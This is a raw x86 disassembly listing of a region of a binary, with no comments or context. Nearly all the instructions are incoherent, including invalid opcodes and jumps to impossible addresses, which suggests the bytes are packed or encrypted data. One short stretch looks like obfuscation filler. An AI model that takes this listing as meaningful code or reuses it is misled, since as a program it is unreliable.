  40aa36:	int    0x9f
  40aa38:	mov    dh,0x8c
  40aa3a:	out    0x15,al
  40aa3c:	ror    ecx,cl
  40aa3e:	mov    ds:0x510c16,eax
  40aa43:	js     0x40a9e3
  40aa45:	sbb    al,0x2e
  40aa47:	mov    ah,0xd1
  40aa49:	es push 0xcd29e882
  40aa4f:	cmc    
  40aa50:	ins    BYTE PTR es:[edi],dx
  40aa51:	and    esp,DWORD PTR [eax-0x505b808a]
  40aa57:	dec    ebp
  40aa58:	loopne 0x40aa4d
  40aa5a:	adc    dh,BYTE PTR [ebx-0x61]
  40aa5d:	mov    ebx,0x339cc01a
  40aa62:	jmp    0xe5eae0a1
  40aa67:	mov    dl,0xa4
  40aa69:	or     eax,0xf68d9b89
  40aa6e:	and    eax,0x1a23a754
  40aa73:	add    BYTE PTR ds:[edx],0x8f
  40aa77:	push   esi
  40aa78:	dec    ecx
  40aa79:	and    DWORD PTR [edi+0x4592ed2d],edx
  40aa7f:	inc    esp
  40aa80:	(bad)  [esi-0x30]
  40aa83:	data16 loope 0x40aa2d
  40aa86:	ror    DWORD PTR [esi],cl
  40aa88:	sbb    BYTE PTR [ecx+0x1abcf4f0],al
  40aa8e:	jmp    0xddb1:0xa0da2532
  40aa95:	pusha  
  40aa96:	std    
  40aa97:	xor    al,0xf7
  40aa99:	inc    edx
  40aa9a:	stos   DWORD PTR es:[edi],eax
  40aa9b:	jns    0x40aa7a
  40aa9d:	loope  0x40aad1
  40aa9f:	add    ch,ah
  40aaa1:	cmp    BYTE PTR [ebp-0x34],0xe8
  40aaa5:	fwait
  40aaa6:	cmp    esi,DWORD PTR [ebx]
  40aaa8:	and    BYTE PTR [ebx],ch
  40aaaa:	rcl    DWORD PTR [eax],cl
  40aaac:	clc    
  40aaad:	retf   0x3e68
  40aab0:	xchg   edi,eax
  40aab1:	pushf  
  40aab2:	mov    cl,0x4a
  40aab4:	push   ss
  40aab5:	jo     0x40aacd
  40aab7:	cmp    ch,BYTE PTR [edx+0x11a7cbed]
  40aabd:	adc    ebx,ebp
  40aabf:	pop    esp
  40aac0:	cmp    ebp,esp
  40aac2:	push   0xffffffd1
  40aac4:	fidiv  DWORD PTR [ecx+0x51799e25]
  40aaca:	jo     0x40ab45
  40aacc:	aam    0x76
  40aace:	arpl   bp,cx
  40aad0:	frstor [edi-0x37]
  40aad3:	pop    ecx
  40aad4:	icebp  
  40aad5:	cmp    esi,DWORD PTR [ecx+0x1b]
  40aad8:	(bad)  
  40aad9:	lods   al,BYTE PTR ds:[esi]
  40aada:	out    dx,eax
  40aadb:	inc    edi
  40aadc:	cmp    dh,0xd3
  40aadf:	popa   
  40aae0:	inc    eax
  40aae1:	sub    eax,0xd0e60f38
  40aae6:	es pop ds
  40aae8:	in     eax,0xef
  40aaea:	fs dec esp
  40aaec:	inc    edx
  40aaed:	sbb    BYTE PTR [esi+ebp*2-0x4b],cl
  40aaf1:	xor    DWORD PTR [esi+ebx*2],edx
  40aaf4:	loop   0x40ab44
  40aaf6:	push   esp
  40aaf7:	js     0x40ab41
  40aaf9:	sub    bh,BYTE PTR [ebp+edx*8-0x5f]
  40aafd:	ja     0x4c7378fb
  40ab03:	push   edx
  40ab04:	sub    DWORD PTR ds:0x845beb90,ebp
  40ab0a:	imul   esp,DWORD PTR [esi+0x28],0x950f259f
  40ab11:	and    ah,BYTE PTR [ebp-0x31]
  40ab14:	sbb    al,0xbb
  40ab16:	jno    0x40ab35
  40ab18:	in     al,0x85
  40ab1a:	sub    DWORD PTR [esi],eax
  40ab1c:	popf   
  40ab1d:	xchg   edi,eax
  40ab1e:	fabs   
  40ab20:	mov    al,BYTE PTR [eax-0x12]
  40ab23:	mov    ah,0x38
  40ab25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab27:	shr    DWORD PTR [ebp-0x759825a9],cl
  40ab2d:	sub    eax,0xa0b1244f
  40ab32:	jp     0x40ab0b
  40ab34:	lahf   
  40ab35:	lods   eax,DWORD PTR ds:[esi]
  40ab36:	cwde   
  40ab37:	jae    0x40aaf5
  40ab39:	(bad)  
  40ab3a:	(bad)  
  40ab3c:	xor    esi,0xe7b51e44
  40ab42:	mov    cl,bl
  40ab44:	sar    BYTE PTR [edi],1
  40ab46:	mov    edx,0xe305e928
  40ab4b:	shr    DWORD PTR [edi+0x4e97439b],0xb9
  40ab52:	ror    DWORD PTR [ebx-0x478d7e00],0x7
  40ab59:	mov    edi,0x6bd3b97a
  40ab5e:	xor    eax,0x7568f6ee
  40ab63:	outs   dx,DWORD PTR ds:[esi]
  40ab64:	and    ebx,DWORD PTR [ecx-0x35]
  40ab67:	jg     0x40abde
  40ab69:	enter  0xaffb,0x26
  40ab6d:	xor    BYTE PTR ds:0x3ffaaf69,bl
  40ab73:	xchg   edx,eax
  40ab74:	dec    esi
  40ab75:	dec    esi
  40ab76:	in     al,0xd7
  40ab78:	and    BYTE PTR [edi],ch
  40ab7a:	inc    eax
  40ab7b:	jne    0x40ab96
  40ab7d:	pusha  
  40ab7e:	js     0x40ab82
  40ab80:	jne    0x40abbc
  40ab82:	inc    edi
  40ab83:	loope  0x40abc5
  40ab85:	push   ebx
  40ab86:	lahf   
  40ab87:	xor    bh,BYTE PTR [ecx+0x2cc42d5c]
  40ab8d:	mov    ds:0x52366f60,al
  40ab92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab93:	repz rol BYTE PTR [ebp-0x55],1
  40ab97:	mov    dh,0x4d
  40ab99:	ds loope 0x40abe7
  40ab9c:	pop    ebp
  40ab9d:	idiv   DWORD PTR [edi+edx*2+0x1f799042]
  40aba4:	mov    bl,0x9c
  40aba6:	mov    edi,0xa7781d57
  40abab:	sbb    eax,0x5b4d4a65
  40abb0:	aad    0x2
  40abb2:	mov    ecx,0xb8f7d459
  40abb7:	and    dl,dh
  40abb9:	frstor [eax]
  40abbb:	into   
  40abbc:	jge    0x40ac18
  40abbe:	add    eax,0x51249b38
  40abc3:	es mov esp,0x3ae7721f
  40abc9:	xor    DWORD PTR [edi+ecx*8+0xf8b9e5f],0xd9d14ca8
  40abd4:	mov    al,0xe1
  40abd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abd7:	outs   dx,DWORD PTR ds:[esi]
  40abd8:	int    0xf
  40abda:	repnz xchg ebp,eax
  40abdc:	outs   dx,BYTE PTR ds:[esi]
  40abdd:	jmp    0x98bb3796
  40abe2:	aas    
  40abe3:	push   0x6
  40abe5:	je     0x40ab6d
  40abe7:	shr    edx,1
  40abe9:	and    edi,edi
  40abeb:	mov    eax,0x8b2e2494
  40abf0:	or     ebp,DWORD PTR [edx-0x42fb0e2f]
  40abf6:	cmp    BYTE PTR [eax+0x4387e1e7],cl
  40abfc:	fsubr  st,st(4)
  40abfe:	mov    dh,0x20
  40ac00:	sbb    eax,0xbec48b33
  40ac05:	test   eax,0xc03b204
  40ac0a:	jg     0x40ab93
  40ac0c:	out    dx,ax
  40ac0e:	scas   al,BYTE PTR es:[edi]
  40ac0f:	sbb    eax,0x86a4acfb
  40ac14:	outs   dx,DWORD PTR ds:[esi]
  40ac15:	outs   dx,DWORD PTR ds:[esi]
  40ac16:	dec    ebp
  40ac17:	xor    ecx,DWORD PTR [eax+0x6212701]
  40ac1d:	pop    es
  40ac1e:	sbb    DWORD PTR [eax+0x4c],edx
  40ac21:	jecxz  0x40ac97
  40ac23:	mov    ecx,0xcb0bccb5
  40ac28:	adc    dh,BYTE PTR [eax-0x2b]
  40ac2b:	rcl    DWORD PTR [ebp-0x2805f899],0xdb
  40ac32:	pusha  
  40ac33:	mov    DWORD PTR [ebp-0x53],0x88714f8d
  40ac3a:	mov    ds:0xddf8cf5,al
  40ac3f:	lods   eax,DWORD PTR ds:[esi]
  40ac40:	cmc    
  40ac41:	dec    esp
  40ac42:	sub    DWORD PTR [ecx+0x44],esi
  40ac45:	ret    
  40ac46:	add    BYTE PTR [eax+0x7f8bf453],dh
  40ac4c:	pop    edi
  40ac4d:	sub    ecx,esp
  40ac4f:	adc    bl,BYTE PTR [eax]
  40ac51:	push   esp
  40ac52:	pop    ecx
  40ac53:	jno    0x40ac84
  40ac55:	dec    edx
  40ac56:	push   ss
  40ac57:	inc    eax
  40ac58:	lds    eax,FWORD PTR [eax]
  40ac5a:	shl    DWORD PTR [edx+0x754955d1],cl
  40ac60:	jle    0x40acd2
  40ac62:	out    0x12,al
  40ac64:	mov    ds:0x5d61575f,eax
  40ac69:	lock repz mov eax,ds:0xffb212de
  40ac70:	(bad)  ds:0xa5b5ad0b
  40ac76:	push   ebx
  40ac77:	and    al,0x63
  40ac79:	mov    edi,0xea6981d1
  40ac7e:	mov    al,ds:0xfa7a1c0
  40ac83:	in     al,dx
  40ac84:	jne    0x40acb5
  40ac86:	xor    eax,0xfb8a50e1
  40ac8b:	mov    ds:0x8ef748d5,al
  40ac90:	push   es
  40ac91:	inc    edi
  40ac92:	fsubr  DWORD PTR [esi+0x54dc6a32]
  40ac98:	fstp   DWORD PTR [edi+0xa9b35e2]
  40ac9e:	mov    DWORD PTR [edx+eiz*2+0x3e],edi
  40aca2:	inc    edx
  40aca3:	mov    ecx,0xc69e6bcc
  40aca8:	and    DWORD PTR [esi+0x70],edi
  40acab:	aaa    
  40acac:	push   ebp
  40acad:	inc    edi
  40acae:	mov    esi,0xc70c08a5
  40acb3:	and    BYTE PTR [edi],ch
  40acb5:	dec    eax
  40acb6:	(bad)
  40acba:	cmp    eax,0x36511a06
  40acbf:	jg     0x40ac89
  40acc1:	dec    esp
  40acc2:	cmp    edi,DWORD PTR [edi-0x2090b24b]
  40acc8:	imul   ecx,DWORD PTR es:[eax],0xcf5309ed
  40accf:	adc    eax,0x2dc517af
  40acd4:	test   BYTE PTR [ecx],ch
  40acd6:	test   al,0x1a
  40acd8:	xor    bh,bh
  40acda:	in     al,0x9f
  40acdc:	cdq    
  40acdd:	(bad)  
  40acde:	shl    ch,cl
  40ace0:	(bad)  
  40ace2:	sub    DWORD PTR [esi*1-0x73a60d10],ebp
  40ace9:	inc    ebx
  40acea:	popf   
  40aceb:	pop    ecx
  40acec:	fstp   QWORD PTR [ecx+0x5c]
  40acef:	sbb    al,0xdc
  40acf1:	ja     0x40ad00
  40acf3:	jae    0x40ad73
  40acf5:	jmp    0xb49a:0xccf604ff
  40acfc:	call   0x8f5a7145
  40ad01:	ins    BYTE PTR es:[edi],dx
  40ad02:	jp     0x40acd6
  40ad04:	pop    esp
  40ad05:	xor    cl,ah
  40ad07:	in     al,dx
  40ad08:	and    eax,0x4cb3bce5
  40ad0d:	xlat   BYTE PTR ds:[ebx]
  40ad0e:	jb     0x40ad1b
  40ad10:	dec    edi
  40ad11:	cdq    
  40ad12:	rcr    ebx,cl
  40ad14:	push   ds
  40ad15:	stos   DWORD PTR es:[edi],eax
  40ad16:	popf   
  40ad17:	xor    DWORD PTR [edx+0x5c],esp
  40ad1a:	inc    ebp
  40ad1b:	ins    BYTE PTR es:[edi],dx
  40ad1c:	int    0x4e
  40ad1e:	mov    esp,0x8b020a59
  40ad23:	mov    WORD PTR [ebx],cs
  40ad25:	jnp    0x40ad95
  40ad27:	xlat   BYTE PTR ds:[ebx]
  40ad28:	mov    al,0x85
  40ad2a:	daa    
  40ad2b:	jmp    0x7730a108
  40ad30:	sti    
  40ad31:	dec    ebx
  40ad32:	add    eax,0xdc057d28
  40ad37:	mov    DWORD PTR [edi+esi*8+0x247cce68],edx
  40ad3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad3f:	outs   dx,BYTE PTR ds:[esi]
  40ad40:	loop   0x40acc4
  40ad42:	push   edi
  40ad43:	std    
  40ad44:	ins    BYTE PTR es:[edi],dx
  40ad45:	pop    ds
  40ad46:	mov    WORD PTR [esi],ss
  40ad48:	ret    0xf732
  40ad4b:	es inc ecx
  40ad4d:	scas   eax,DWORD PTR es:[edi]
  40ad4e:	mov    cl,0x18
  40ad50:	sbb    ebp,DWORD PTR [ebp-0x3e]
  40ad53:	xor    ah,BYTE PTR [esi+edx*1-0x7f]
  40ad57:	mov    al,0x9a
  40ad59:	jns    0x40adab
  40ad5b:	cmp    al,BYTE PTR [edi+0xa805714]
  40ad61:	stc    
  40ad62:	je     0x40aceb
  40ad64:	mov    bh,0xda
  40ad67:	sbb    esi,eax
  40ad69:	icebp  
  40ad6a:	dec    esp
  40ad6b:	and    al,0xc7
  40ad6d:	test   BYTE PTR [edx+ecx*2],0x1c
  40ad71:	mov    ecx,0x6d54f314
  40ad76:	mov    ebp,0xa445212f
  40ad7b:	jmp    0xf54b:0xd71794f
  40ad82:	adc    DWORD PTR [ecx+0x1f],esi
  40ad85:	addr16 mov eax,0x10d4a139
  40ad8b:	sub    DWORD PTR [edi+0xf30cfa6],0x1cf9533e
  40ad95:	fdivrp st(4),st
  40ad97:	inc    esi
  40ad98:	rcr    DWORD PTR [ebx-0x61],0x85
  40ad9c:	and    al,0xbb
  40ad9e:	or     ah,al
  40ada0:	mov    edx,DWORD PTR ds:0xfdb7d16
  40ada6:	push   DWORD PTR [esi+0x49ad1dac]
  40adac:	inc    esi
  40adad:	mov    ebp,0x507632a9
  40adb2:	neg    bl
  40adb4:	add    eax,ebx
  40adb6:	xor    DWORD PTR [eax+0xf48a5a6],0x2900293e
  40adc0:	adc    edx,edx
  40adc2:	xchg   edi,eax
  40adc3:	cmp    DWORD PTR [ebp+0x5f],edx
  40adc6:	inc    esp
  40adc7:	(bad)  
  40adc8:	or     DWORD PTR [edx-0x456c1f12],edx
  40adce:	fcom   DWORD PTR [edx]
  40add0:	adc    DWORD PTR [edx],0x7d
  40add3:	and    esp,DWORD PTR [ecx]
  40add5:	fnstcw WORD PTR [edx]
  40add7:	daa    
  40add8:	and    al,0x91
  40adda:	repnz adc edx,0xffffffa3
  40adde:	sub    eax,0x5cb10b88
  40ade3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ade4:	or     BYTE PTR [edx+0x3b6c2830],0x4c
  40adeb:	or     esp,0x23d71288
  40adf1:	loope  0x40ad89
  40adf3:	mov    eax,ds:0xb6ea4f8a
  40adf8:	imul   edx,ecx,0xffffff89
  40adfb:	ss or  ah,cl
  40adfe:	and    al,0x7d
  40ae00:	sar    DWORD PTR [edi+0x5e898acd],0x73
  40ae07:	adc    eax,esp
  40ae09:	mov    DWORD PTR [ecx-0x3f],esp
  40ae0c:	fild   DWORD PTR [eax-0x3f]
  40ae0f:	pop    esi
  40ae10:	xchg   esi,eax
  40ae11:	jne    0x40ae78
  40ae13:	int3   
  40ae14:	lds    ebx,FWORD PTR [eax+0x40b25359]
  40ae1a:	cli    
  40ae1b:	les    esp,FWORD PTR [edi-0x4aa67e1d]
  40ae21:	cmp    al,0x5c
  40ae23:	pop    ebx
  40ae24:	lahf   
  40ae25:	inc    edi
  40ae26:	sbb    dh,BYTE PTR [esi+0xc8aa313]
  40ae2c:	xor    eax,0xa180cccd
  40ae31:	enter  0x6ee3,0x1e
  40ae35:	sub    esp,eax
  40ae37:	mov    edx,0xa02cdcfb
  40ae3c:	rcr    al,cl
  40ae3e:	fs ja  0x40ae0c
  40ae41:	mov    WORD PTR [esi+0x1288264e],ss
  40ae47:	sub    al,0x12
  40ae49:	test   eax,0x801507d9
  40ae4e:	pop    ebp
  40ae4f:	cmp    eax,0x5d481fe1
  40ae54:	jb     0x40aea7
  40ae56:	aad    0x28
  40ae58:	test   eax,0x5e027045
  40ae5d:	stc    
  40ae5e:	call   0x23384ed2
  40ae63:	pop    ebx
  40ae64:	adc    DWORD PTR [edi+0x76656919],esi
  40ae6a:	cwde   
  40ae6b:	ins    DWORD PTR es:[edi],dx
  40ae6c:	cmc    
  40ae6d:	add    ebx,DWORD PTR [ecx+edx*8+0x14]
  40ae71:	cmc    
  40ae72:	inc    ebx
  40ae73:	pop    ds
  40ae74:	sub    al,ah
  40ae76:	adc    DWORD PTR [ecx+0x65],0x8ca99e7d
  40ae7d:	push   edx
  40ae7e:	mov    eax,0x24e7d288
  40ae83:	lods   al,BYTE PTR ds:[esi]
  40ae84:	push   0x35
  40ae86:	sub    ah,BYTE PTR [edi-0x25]
  40ae89:	inc    edx
  40ae8a:	out    0xd2,eax
  40ae8c:	xchg   BYTE PTR [ebx],dl
  40ae8e:	cdq    
  40ae8f:	rol    BYTE PTR [ebx],cl
  40ae91:	fcomip st,st(7)
  40ae93:	mov    al,ds:0x21ac1fcb
  40ae98:	dec    ebp
  40ae99:	push   ss
  40ae9a:	jl     0x40ae49
  40ae9c:	stos   BYTE PTR es:[edi],al
  40ae9d:	adc    DWORD PTR [ebx],0x590ab896
  40aea3:	cmp    BYTE PTR [eax],bl
  40aea5:	(bad)  
  40aea6:	out    dx,eax
  40aea7:	mov    ebp,0xb1a7c5fc
  40aeac:	les    ebp,FWORD PTR [eax]
  40aeae:	xchg   edx,eax
  40aeaf:	xchg   edi,eax
  40aeb0:	lods   al,BYTE PTR ds:[esi]
  40aeb1:	xor    dl,dh
  40aeb3:	dec    DWORD PTR [ecx+0x5b]
  40aeb6:	sub    edi,edi
  40aeb8:	mov    eax,0x30455362
  40aebd:	sti    
  40aebe:	retf   
  40aebf:	call   0x96cc7c14
  40aec4:	mov    edi,0x94dd44
  40aec9:	xlat   BYTE PTR ds:[ebx]
  40aeca:	call   FWORD PTR [ecx+0x45]
  40aecd:	nop
  40aece:	xchg   edx,eax
  40aecf:	out    dx,eax
  40aed0:	or     eax,0x36b1f053
  40aed5:	out    dx,eax
  40aed6:	cli    
  40aed7:	push   es
  40aed8:	das    
  40aed9:	mov    edi,0xacc20dd5
  40aede:	lahf   
  40aedf:	out    dx,eax
  40aee0:	mov    ch,0xec
  40aee2:	pop    edx
  40aee3:	xchg   DWORD PTR [ecx],ebx
  40aee5:	fnsave [ebx-0x2c8eb797]
  40aeeb:	push   ds
  40aeec:	sbb    al,0x75
  40aeee:	mov    edi,0xf2169c1e
  40aef3:	cmp    DWORD PTR cs:[eax],edi
  40aef6:	sbb    edi,DWORD PTR [ebx]
  40aef8:	xchg   esi,eax
  40aef9:	mov    ah,0x17
  40aefb:	clc    
  40aefc:	out    dx,al
  40aefd:	jle    0x40af3e
  40aeff:	and    BYTE PTR [ecx-0x4ac6a7a3],bl
  40af05:	xor    DWORD PTR [ebx-0x6623ccf5],ebp
  40af0b:	ret    
  40af0c:	outs   dx,BYTE PTR ds:[esi]
  40af0d:	and    ecx,esi
  40af0f:	sbb    al,ah
  40af11:	lock dec eax
  40af13:	call   0xb5c5b09d
  40af18:	lock push edi
  40af1a:	inc    edi
  40af1b:	inc    esp
  40af1c:	out    dx,al
  40af1d:	and    eax,0x39af3281
  40af22:	mov    al,0xf7
  40af25:	out    dx,eax
  40af26:	pop    ss
  40af27:	mov    ebx,DWORD PTR [ebp+0x18]
  40af2a:	add    DWORD PTR [edx],0xfffffffb
  40af2d:	lods   al,BYTE PTR ds:[esi]
  40af2e:	cmp    ch,BYTE PTR [esp+edx*1]
  40af31:	arpl   WORD PTR [eax+0x103ecece],si
  40af37:	rol    DWORD PTR [esp+eax*2-0x3f3bcc16],1
  40af3e:	gs pusha 
  40af40:	imul   ecx,DWORD PTR [edx+0x3],0xffffffce
  40af44:	mov    ds:0x52cb4142,eax
  40af49:	add    al,0x27
  40af4b:	or     ch,BYTE PTR [edx+0x45a41adb]
  40af51:	fsub   st(4),st
  40af53:	pop    edx
  40af54:	test   eax,0x29955d4a
  40af59:	stos   DWORD PTR es:[edi],eax
  40af5a:	push   edx
  40af5b:	rcl    DWORD PTR [edi+0x6e75a520],cl
  40af61:	xor    BYTE PTR [eax+0x64],ch
  40af64:	dec    edi
  40af65:	int3   
  40af66:	sbb    al,0xc8
  40af68:	push   ebp
  40af69:	(bad)  
  40af6a:	adc    ecx,esi
  40af6c:	pop    ecx
  40af6d:	loopne 0x40af83
  40af6f:	retf   0x33d9
  40af72:	add    edx,DWORD PTR [esi]
  40af74:	fiadd  DWORD PTR [edi-0x3bded6ff]
  40af7a:	ds ss aas 
  40af7d:	test   edx,ebp
  40af7f:	push   0x28
  40af81:	popf   
  40af82:	jmp    0x40afc9
  40af84:	stos   BYTE PTR es:[edi],al
  40af85:	mov    al,ds:0xbe025e55
  40af8a:	jns    0x40af9f
  40af8c:	cmp    bl,BYTE PTR [esi-0x600fb92a]
  40af92:	inc    ebx
  40af93:	pop    eax
  40af94:	mov    ecx,edx
  40af96:	repnz dec eax
  40af98:	call   0x9efc5b19
  40af9d:	inc    edi
  40af9e:	test   eax,0x3e2fcf68
  40afa3:	out    dx,eax
  40afa4:	dec    ebp
  40afa5:	jbe    0x40afff
  40afa7:	pop    ebp
  40afa8:	ds push esi
  40afaa:	dec    ebp
  40afab:	(bad)  
  40afac:	gs es ss test eax,0xaae2c062
  40afb4:	leave  
  40afb5:	or     DWORD PTR [esi-0x768068a8],esi
  40afbb:	loopne 0x40afa9
  40afbd:	inc    edx
  40afbe:	mov    bl,0x6e
  40afc0:	pop    ds
  40afc1:	in     eax,dx
  40afc2:	scas   al,BYTE PTR es:[edi]
  40afc3:	dec    esp
  40afc4:	xchg   esi,eax
  40afc5:	arpl   WORD PTR [eax],ax
  40afc7:	call   0x8b89:0xd64ef805
  40afce:	inc    ebp
  40afcf:	cld    
  40afd0:	xor    eax,esi
  40afd2:	add    eax,edi
  40afd4:	mov    DWORD PTR [ebp-0x10],eax
  40afd7:	mov    ebx,0x65655
  40afdc:	add    ebx,0x3234
  40afe2:	xchg   ebx,esi
  40afe4:	xor    ebx,ebx
  40afe6:	push   esi
  40afe7:	mov    esi,ebx
  40afe9:	pop    ebx
  40afea:	mov    edx,esi
  40afec:	jmp    0x40d37e
  40aff1:	cli    
  40aff2:	mov    DWORD PTR [ecx-0x65b47dad],esi
  40aff8:	add    BYTE PTR ds:0xf029b0d0,0x5f
  40afff:	dec    eax
  40b000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b001:	sub    esp,esi
  40b003:	add    DWORD PTR [ebx-0x7c7ca1f4],0xffffffd9
  40b00a:	jge    0x40aff2
  40b00c:	push   ss
  40b00d:	dec    esp
  40b00e:	cmc    
  40b00f:	cmp    edi,DWORD PTR [ebx-0x5ad46708]
  40b015:	adc    DWORD PTR ds:0xff5b8103,ebp
  40b01b:	in     eax,0x69
  40b01d:	jae    0x40b029
  40b01f:	les    ecx,FWORD PTR [eax]
  40b021:	jno    0x40aff0
  40b023:	and    esp,DWORD PTR ds:0xb8469928
  40b029:	jo     0x40afb4
  40b02b:	es dec esp
  40b02d:	outs   dx,BYTE PTR ds:[esi]
  40b02e:	xor    al,dh
  40b030:	adc    ch,BYTE PTR [ecx+0x32]
  40b033:	jge    0x40afbd
  40b035:	and    DWORD PTR [eax-0x5a35b583],ecx
  40b03b:	sbb    bl,cl
  40b03d:	sub    dl,0xd1
  40b040:	and    al,0xa
  40b042:	sti    
  40b043:	jo     0x40b038
  40b045:	je     0x40b00c
  40b047:	lds    esi,FWORD PTR [edx+edx*4-0x7e1b4cde]
  40b04e:	scas   eax,DWORD PTR es:[edi]
  40b04f:	loopne 0x40b08b
  40b051:	fidiv  DWORD PTR [edx+0x3a]
  40b054:	lahf   
  40b055:	xor    eax,DWORD PTR [ebp-0x18bb4e62]
  40b05b:	sbb    esp,DWORD PTR [edi+0x778ee9d7]
  40b061:	sbb    ebx,esi
  40b063:	icebp  
  40b064:	xchg   esp,eax
  40b065:	fcomp  QWORD PTR [edi-0x60]
  40b068:	mov    eax,0x798bf538
  40b06d:	inc    ebp
  40b06e:	rol    ebx,cl
  40b070:	xor    al,0xb
  40b072:	sub    eax,0xdb2df416
  40b077:	xchg   ecx,eax
  40b078:	pop    edi
  40b079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b07a:	add    esp,edi
  40b07c:	mov    ds:0x25e064eb,al
  40b081:	dec    esp
  40b082:	ss pop edx
  40b084:	loop   0x40b102
  40b086:	ficomp DWORD PTR [edx]
  40b088:	mov    eax,ds:0x4fb47520
  40b08d:	pop    esp
  40b08e:	add    al,0x59
  40b090:	fwait
  40b091:	nop
  40b092:	inc    edx
  40b093:	lahf   
  40b094:	shl    DWORD PTR [esi],cl
  40b096:	mov    WORD PTR [ebx+0x51ab1a15],cs
  40b09c:	mov    ebp,0xbf27a934
  40b0a1:	shl    BYTE PTR [ebp-0x2f26be11],cl
  40b0a7:	scas   eax,DWORD PTR es:[edi]
  40b0a8:	add    al,bl
  40b0aa:	lods   eax,DWORD PTR ds:[esi]
  40b0ab:	cmp    al,0x2a
  40b0ad:	imul   ecx,DWORD PTR [esi+0x52],0x2ffb7864
  40b0b4:	test   BYTE PTR [edx+0x6d8c9ce9],dh
  40b0ba:	in     eax,0x57
  40b0bc:	mov    eax,0xcf68f363
  40b0c1:	mov    cl,BYTE PTR [eax-0x446f343c]
  40b0c7:	inc    eax
  40b0c8:	add    DWORD PTR [esi],edx
  40b0ca:	div    DWORD PTR [edx-0x59c803fb]
  40b0d0:	outs   dx,BYTE PTR ds:[esi]
  40b0d1:	adc    al,0x52
  40b0d3:	fild   QWORD PTR ds:0x9394dd5f
  40b0d9:	xor    DWORD PTR ss:[ecx],ecx
  40b0dc:	sbb    al,0x9d
  40b0de:	repz cwde 
  40b0e0:	jge    0x40b0bd
  40b0e2:	test   DWORD PTR [edi+ecx*2-0x4e4f66ea],esp
  40b0e9:	shr    DWORD PTR [ebp+0x9],cl
  40b0ec:	adc    ah,BYTE PTR [ebx+ebx*2-0x7d79f136]
  40b0f3:	push   ds
  40b0f4:	push   cs
  40b0f5:	adc    BYTE PTR [ecx+0x27],bl
  40b0f8:	pop    edi
  40b0f9:	mov    ebp,0x57ce6586
  40b0fe:	aad    0xa7
  40b100:	xchg   edi,eax
  40b101:	in     eax,dx
  40b102:	aad    0xb0
  40b104:	imul   DWORD PTR [ebx+esi*8]
  40b107:	fsubr  QWORD PTR [edi+edx*2]
  40b10a:	aad    0xe9
  40b10c:	add    al,0x92
  40b10e:	dec    ecx
  40b10f:	jne    0x40b0f7
  40b111:	or     eax,0x243ad823
  40b116:	push   edi
  40b117:	mov    edx,0xbc2be1be
  40b11c:	push   esp
  40b11d:	aam    0x56
  40b11f:	pop    esi
  40b120:	xchg   esp,eax
  40b121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b122:	xor    DWORD PTR [ecx+0x6f8b3b1],0x63
  40b129:	mov    ah,0x62
  40b12b:	inc    edi
  40b12c:	adc    BYTE PTR [esp+edi*1-0x790ba4d5],al
  40b133:	std    
  40b134:	loopne 0x40b0be
  40b136:	or     bh,ah
  40b138:	push   eax
  40b139:	xor    dh,al
  40b13b:	push   edx
  40b13c:	adc    BYTE PTR [edi+0x207d1800],0x3a
  40b143:	mov    dl,0xe0
  40b145:	mov    ebx,0x5198d544
  40b14a:	xor    BYTE PTR [edx-0x19],bh
  40b14d:	enter  0xf0c0,0xa0
  40b151:	add    BYTE PTR [ecx-0x43],cl
  40b154:	cmp    dh,BYTE PTR gs:[ecx+0x57]
  40b158:	add    al,0xf0
  40b15a:	fsub   QWORD PTR [ebx]
  40b15c:	dec    edx
  40b15d:	sar    esi,cl
  40b15f:	outs   dx,DWORD PTR ds:[esi]
  40b160:	xor    ah,BYTE PTR [eax-0x11]
  40b163:	into   
  40b164:	pop    ds
  40b165:	les    ebp,FWORD PTR [esi+0x61]
  40b168:	jnp    0x40b17f
  40b16a:	mov    edi,0x43d7ffb2
  40b16f:	dec    eax
  40b170:	std    
  40b171:	mov    al,cs:0xc2c10935
  40b177:	or     al,0x68
  40b179:	test   bl,dh
  40b17b:	push   ecx
  40b17c:	ja     0x40b1f4
  40b17e:	jmp    FWORD PTR [esi+0x4e011fc]
  40b184:	adc    al,ah
  40b186:	pop    ss
  40b187:	es shl esp,1
  40b18a:	outs   dx,DWORD PTR ds:[esi]
  40b18b:	add    eax,0x692310ee
  40b190:	stos   BYTE PTR es:[edi],al
  40b191:	add    eax,0x8c3b97d3
  40b196:	fimul  DWORD PTR [edi]
  40b198:	pop    edx
  40b199:	imul   ebx,edi,0xffffff94
  40b19c:	pushf  
  40b19d:	mov    DWORD PTR [ecx+edx*4],ecx
  40b1a0:	mov    DWORD PTR [esi],0x1e235102
  40b1a6:	jbe    0x40b1dc
  40b1a8:	ins    DWORD PTR es:[edi],dx
  40b1a9:	xchg   ebx,eax
  40b1aa:	push   ss
  40b1ab:	pop    ecx
  40b1ac:	mov    BYTE PTR [eax-0x42],al
  40b1af:	sbb    al,0x95
  40b1b1:	ds xchg ecx,eax
  40b1b3:	je     0x40b147
  40b1b5:	lods   eax,DWORD PTR ds:[esi]
  40b1b6:	pop    es
  40b1b7:	cmc    
  40b1b8:	jmp    0x40b21f
  40b1ba:	jle    0x40b231
  40b1bc:	jmp    0x40b1b2
  40b1be:	pop    ebp
  40b1bf:	push   ds
  40b1c0:	and    al,0x41
  40b1c2:	xchg   ecx,eax
  40b1c3:	dec    esi
  40b1c4:	repz xchg esp,eax
  40b1c6:	retf   0x8b86
  40b1c9:	icebp  
  40b1ca:	mov    DWORD PTR ss:[ebx],0xd990c0b5
  40b1d1:	jl     0x40b192
  40b1d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d4:	jmp    0x9e76:0x18b946ea
  40b1db:	inc    ecx
  40b1dc:	pop    esi
  40b1dd:	loop   0x40b1dc
  40b1df:	dec    esp
  40b1e0:	sub    al,0x52
  40b1e2:	add    al,0x20
  40b1e4:	adc    eax,0x229df7c9
  40b1e9:	xchg   BYTE PTR [edx+0x3844e48a],dh
  40b1ef:	pop    ss
  40b1f0:	mov    ch,0x8b
